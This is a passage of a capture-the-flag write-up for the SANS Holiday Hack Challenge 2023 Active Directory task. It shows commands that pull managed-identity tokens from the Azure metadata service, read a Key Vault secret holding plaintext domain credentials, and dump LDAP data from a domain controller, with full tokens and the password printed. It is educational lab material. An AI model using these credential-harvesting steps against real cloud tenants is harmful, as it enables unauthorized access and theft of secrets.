# SANS Holiday Hack Challenge 2023 - Active Directory

## Description

> Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

> **Ribb Bonbowford (Coggoggle Marina)**:
*Hello, I'm Ribb Bonbowford. Nice to meet you!
Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.
Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.
I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.
I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.
Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.*

### Hints

> **Misconfiguration ADventures**: Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.*

> **Useful Tools**: It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.

### Metadata

- Difficulty: 4/5
- Tags: `active directory`, `certificate services`, `adcs`, `impacket`, `smb`, `certipy`

## Solution

### Video

Videos are coming soon! I did not want to put them on GitHub as they are 10 - 100 MBs.
<!-- <video src="media/active-directory.mp4" width='100%' controls playsinline></video> -->

### Write-up

Using the previously obtained SSH access as `alabaster` user we can start a reconnaissance process in Azure.

To access Azure REST API, we need an access token. We can obtain an access token from the `metadata` server available at `169.254.169.254`. Let's obtain an access token for `https://management.azure.com/`.

```shell
alabaster@ssh-server-vm:/tmp$ curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MjI0MzcsIm5iZiI6MTcwMzYyMjQzNywiZXhwIjoxNzAzNzA5MTM3LCJhaW8iOiJFMlZnWUppeVYrQm9jRjllclBqUkc1UHYrYXpaQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJNTlB4LXNvNlowR2dadGk1QlJxNkF3IiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.yceA7zs8Ny0f94pV3En5tmeMGqzuUlZwexZ92NxCC3PeaL5xHjXt1iqiyQpjyVek1Aj_hQMBEMg7k7f1KtaKncMDtv0GTQdCPUIxSuhqRX6SGaPHxVgvPWtHs6I5l1YU45rcvnAHZgamya6ygrLcMhlU6I-quZJo5kHgBYEeK4_y3AWjow6k2fbNDBQYW3ZJTtSiUp7omue8RYbM-8PmNxjyEkIuMxCEI2fIrs8iedZvHG9VAc-Pr9gxvPPUCYspR43zRpCgP3CC-72pm4BNXhZlbB86CTqYHERD83Mx4Jzb-Z98kvwCAFJbnqQWYEIGfT-yWeFwmM8WdXaPOwmmvw",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "86324",
  "expires_on": "1703709137",
  "ext_expires_in": "86399",
  "not_before": "1703622437",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

With the obtained access token, we can query the available `Vaults` in the Azure KeyVault. There is two: `northpole-it-kv` and `northpole-ssh-certs-kv`. We can guess that the first one is interesting for us.

```shell
alabaster@ssh-server-vm:/tmp$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IpOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MjI0MzcsIm5iZiI6MTcwMzYyMjQzNywiZXhwIjoxNzAzNzA5MTM3LCJhaW8iOiJFMlZnWUppeVYrQm9jRjllclBqUkc1UHYrYXpaQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJNTlB4LXNvNlowR2dadGk1QlJxNkF3IiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.yceA7zs8Ny0f94pV3En5tmeMGqzuUlZwexZ92NxCC3PeaL5xHjXt1iqiyQpjyVek1Aj_hQMBEMg7k7f1KtaKncMDtv0GTQdCPUIxSuhqRX6SGaPHxVgvPWtHs6I5l1YU45rcvnAHZgamya6ygrLcMhlU6I-quZJo5kHgBYEeK4_y3AWjow6k2fbNDBQYW3ZJTtSiUp7omue8RYbM-8PmNxjyEkIuMxCEI2fIrs8iedZvHG9VAc-Pr9gxvPPUCYspR43zRpCgP3CC-72pm4BNXhZlbB86CTqYHERD83Mx4Jzb-Z98kvwCAFJbnqQWYEIGfT-yWeFwmM8WdXaPOwmmvw" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01 | jq
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-10-30T13:17:02.532Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-10-30T13:17:02.532Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "Standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [],
        "enabledForDeployment": false,
        "enabledForDiskEncryption": false,
        "enabledForTemplateDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "enableRbacAuthorization": true,
        "vaultUri": "https://northpole-it-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-11-12T01:47:13.059Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-11-12T01:50:52.742Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "0bc7ae9d-292d-4742-8830-68d12469d759",
            "permissions": {
              "keys": [
                "all"
              ],
              "secrets": [
                "all"
              ],
              "certificates": [
                "all"
              ],
              "storage": [
                "all"
              ]
            }
          },
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "1b202351-8c85-46f1-81f8-5528e92eb7ce",
            "permissions": {
              "secrets": [
                "get"
              ]
            }
          }
        ],
        "enabledForDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "vaultUri": "https://northpole-ssh-certs-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    }
  ],
  "nextLink": "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&$skiptoken=bm9ydGhwb2xlLXJnMXxub3J0aHBvbGUtc3NoLWNlcnRzLWt2"
}
```

Now, we should obtain an access token for the `https://vault.azure.net` resource and query the content of the Vault.

```shell
alabaster@ssh-server-vm:/tmp$ curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fvault.azure.net" | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MjE1MzMsIm5iZiI6MTcwMzYyMTUzMywiZXhwIjoxNzAzNzA4MjMzLCJhaW8iOiJFMlZnWURqNnkzNk91dlZSeFhJdHN5VTN6ZnFQQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiYjVpc0tUckx0azZoZ01lWHhyS1FCQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.r_QAMrFkaTitB1e88MrfmKEMHRtdhsWjJoJ4BMFoGxQsGWLbC0zjBdzoIv4eBsglWG0YBbppTDHMjjhxZpgSqedV58ooFVap3bJ9Hdsg1GNZDDSKvLfIHJ3nvkfvTmgiPJUepSKBXlMky531WxVsc9npf3djxcGB8akxSAJD6dN50Z8amfmIsTPv70CvMUl3rt2rkFRQ6SPQoVlAU4Hr3v8QZhWPURJCTIMmUK6Jx6VqVNl8I-0Z4crbKVjM-DFClvvAslpbvZh867U2F2wnM62Fy3KGKLz9VznUs5EYVmlHIScCSLjfeHCT-XWwL87VuiH5PNjsXwXM3hiX-bUnVg",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "84908",
  "expires_on": "1703708233",
  "ext_expires_in": "86399",
  "not_before": "1703621533",
  "resource": "https://vault.azure.net",
  "token_type": "Bearer"
}
```

Let's query the `Secrets` stored in the Vault.

```shell
alabaster@ssh-server-vm:/tmp$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MjE1MzMsIm5iZiI6MTcwMzYyMTUzMywiZXhwIjoxNzAzNzA4MjMzLCJhaW8iOiJFMlZnWURqNnkzNk91dlZSeFhJdHN5VTN6ZnFQQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiYjVpc0tUckx0azZoZ01lWHhyS1FCQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.r_QAMrFkaTitB1e88MrfmKEMHRtdhsWjJoJ4BMFoGxQsGWLbC0zjBdzoIv4eBsglWG0YBbppTDHMjjhxZpgSqedV58ooFVap3bJ9Hdsg1GNZDDSKvLfIHJ3nvkfvTmgiPJUepSKBXlMky531WxVsc9npf3djxcGB8akxSAJD6dN50Z8amfmIsTPv70CvMUl3rt2rkFRQ6SPQoVlAU4Hr3v8QZhWPURJCTIMmUK6Jx6VqVNl8I-0Z4crbKVjM-DFClvvAslpbvZh867U2F2wnM62Fy3KGKLz9VznUs5EYVmlHIScCSLjfeHCT-XWwL87VuiH5PNjsXwXM3hiX-bUnVg" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

There is one: `tmpAddUserScript`. Let's get the content.

```shell
alabaster@ssh-server-vm:/tmp$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MjE1MzMsIm5iZiI6MTcwMzYyMTUzMywiZXhwIjoxNzAzNzA4MjMzLCJhaW8iOiJFMlZnWURqNnkzNk91dlZSeFhJdHN5VTN6ZnFQQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiYjVpc0tUckx0azZoZ01lWHhyS1FCQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.r_QAMrFkaTitB1e88MrfmKEMHRtdhsWjJoJ4BMFoGxQsGWLbC0zjBdzoIv4eBsglWG0YBbppTDHMjjhxZpgSqedV58ooFVap3bJ9Hdsg1GNZDDSKvLfIHJ3nvkfvTmgiPJUepSKBXlMky531WxVsc9npf3djxcGB8akxSAJD6dN50Z8amfmIsTPv70CvMUl3rt2rkFRQ6SPQoVlAU4Hr3v8QZhWPURJCTIMmUK6Jx6VqVNl8I-0Z4crbKVjM-DFClvvAslpbvZh867U2F2wnM62Fy3KGKLz9VznUs5EYVmlHIScCSLjfeHCT-XWwL87VuiH5PNjsXwXM3hiX-bUnVg" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 | jq
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

```powershell
Import-Module ActiveDirectory; $UserName = "elfy"; $UserDomain = "northpole.local"; $UserUPN = "$UserName@$UserDomain"; $Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force; $DCIP = "10.0.0.53"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

There are multiple interesting secrets in this script:
- domain: `northpole.local`
- username: `elfy`
- password: ```J4`ufC49/J4766```
- domain controller IP: `10.0.0.53`

We have some credentials so we can do some AD reconnaissance.

First, let's use `ldapdomaindump` to obtain a bunch of interesting information about the domain.

```shell
alabaster@ssh-server-vm:/tmp$ ldapdomaindump -u northpole.local\\elfy -p J4\`ufC49/J4766 10.0.0.53
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
alabaster@ssh-server-vm:/tmp$ ls  
domain_computers.grep  domain_computers.json        domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json  domain_users.html  domain_users_by_group.html
domain_computers.html  domain_computers_by_os.html  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users.grep   domain_users.json
```

We can try to find and access some file shares with the `elfy` user.

First, get the possible target computer where the share can be located. There is only one, the DC at `10.0.0.53`, because the other VM is our current VM (`SSH-VM`).

```shell
alabaster@ssh-server-vm:/tmp$ cat domain_computers.json | jq
[
  {
    "attributes": {
      "accountExpires": [
        "9999-12-31 23:59:59.999999+00:00"
      ],
      "badPasswordTime": [
        "1601-01-01 00:00:00+00:00"
      ],
      "badPwdCount": [
        0
      ],
      "cn": [
        "SSH-VM"
      ],
      "codePage": [
        0
      ],
      "countryCode": [
        0
      ],
      "dSCorePropagationData": [
        "1601-01-01 00:00:00+00:00"
      ],
      "distinguishedName": [
        "CN=SSH-VM,CN=Computers,DC=northpole,DC=local"
      ],
      "instanceType": [
        4
      ],
      "isCriticalSystemObject": [
        false
      ],
      "lastLogoff": [
        "1601-01-01 00:00:00+00:00"
      ],
      "lastLogon": [
        "1601-01-01 00:00:00+00:00"
      ],
      "localPolicyFlags": [
        0
      ],
      "logonCount": [
        0
      ],
      "mS-DS-CreatorSID": [
        {
          "encoded": "AQUAAAAAAAUVAAAA98Xx+9ywJggVNzovUAQAAA==",
          "encoding": "base64"
        }
      ],
      "name": [
        "SSH-VM"
      ],
      "objectCategory": [
        "CN=Computer,CN=Schema,CN=Configuration,DC=northpole,DC=local"
      ],
      "objectClass": [
        "top",
        "person",
        "organizationalPerson",
        "user",
        "computer"
      ],
      "objectGUID": [
        "{2b7333b8-913d-4663-b337-995fc6cb884a}"
      ],
      "objectSid": [
        "S-1-5-21-4226926071-136753372-792344341-1106"
      ],
      "primaryGroupID": [
        515
      ],
      "pwdLastSet": [
        "1601-01-01 00:00:00+00:00"
      ],
      "sAMAccountName": [
        "SSH-VM$"
      ],
      "sAMAccountType": [
        805306369
      ],
      "uSNChanged": [
        13210
      ],
      "uSNCreated": [
        13206
      ],
      "userAccountControl": [
        4096
      ],
      "whenChanged": [
        "2024-01-04 11:20:01+00:00"
      ],
      "whenCreated": [
        "2024-01-04 11:20:01+00:00"
      ]
    },
    "dn": "CN=SSH-VM,CN=Computers,DC=northpole,DC=local"
  },
  {
    "attributes": {
      "accountExpires": [
        "9999-12-31 23:59:59.999999+00:00"
      ],
      "badPasswordTime": [
        "1601-01-01 00:00:00+00:00"
      ],
      "badPwdCount": [
        0
      ],
      "cn": [
        "npdc01"
      ],
      "codePage": [
        0
      ],
      "countryCode": [
        0
      ],
      "dNSHostName": [
        "npdc01.northpole.local"
      ],
      "dSCorePropagationData": [
        "2024-01-04 01:11:33+00:00",
        "1601-01-01 00:00:01+00:00"
      ],
      "distinguishedName": [
        "CN=npdc01,OU=Domain Controllers,DC=northpole,DC=local"
      ],
      "instanceType": [
        4
      ],
      "isCriticalSystemObject": [
        true
      ],
      "lastLogoff": [
        "1601-01-01 00:00:00+00:00"
      ],
      "lastLogon": [
        "2024-01-04 17:11:50.935793+00:00"
      ],
      "lastLogonTimestamp": [
        "2024-01-04 01:12:13.945444+00:00"
      ],
      "localPolicyFlags": [
        0
      ],
      "logonCount": [
        64
      ],
      "memberOf": [
        "CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=northpole,DC=local",
        "CN=Cert Publishers,CN=Users,DC=northpole,DC=local"
      ],
      "msDFSR-ComputerReferenceBL": [
        "CN=npdc01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=northpole,DC=local"
      ],
      "msDS-SupportedEncryptionTypes": [
        28
      ],
      "name": [
        "npdc01"
      ],
      "objectCategory": [
        "CN=Computer,CN=Schema,CN=Configuration,DC=northpole,DC=local"
      ],
      "objectClass": [
        "top",
        "person",
        "organizationalPerson",
        "user",
        "computer"
      ],
      "objectGUID": [
        "{fd62da9f-f9fb-4cdc-8f67-546522f55b21}"
      ],
      "objectSid": [
        "S-1-5-21-4226926071-136753372-792344341-1000"
      ],
      "operatingSystem": [
        "Windows Server 2022 Datacenter"
      ],
      "operatingSystemVersion": [
        "10.0 (20348)"
      ],
      "primaryGroupID": [
        516
      ],
      "pwdLastSet": [
        "2024-01-04 01:12:02.354170+00:00"
      ],
      "rIDSetReferences": [
        "CN=RID Set,CN=npdc01,OU=Domain Controllers,DC=northpole,DC=local"
      ],
      "sAMAccountName": [
        "npdc01$"
      ],
      "sAMAccountType": [
        805306369
      ],
      "serverReferenceBL": [
        "CN=npdc01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=northpole,DC=local"
      ],
      "servicePrincipalName": [
        "Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/npdc01.northpole.local",
        "TERMSRV/npdc01",
        "TERMSRV/npdc01.northpole.local",
        "ldap/npdc01.northpole.local/ForestDnsZones.northpole.local",
        "ldap/npdc01.northpole.local/DomainDnsZones.northpole.local",
        "DNS/npdc01.northpole.local",
        "GC/npdc01.northpole.local/northpole.local",
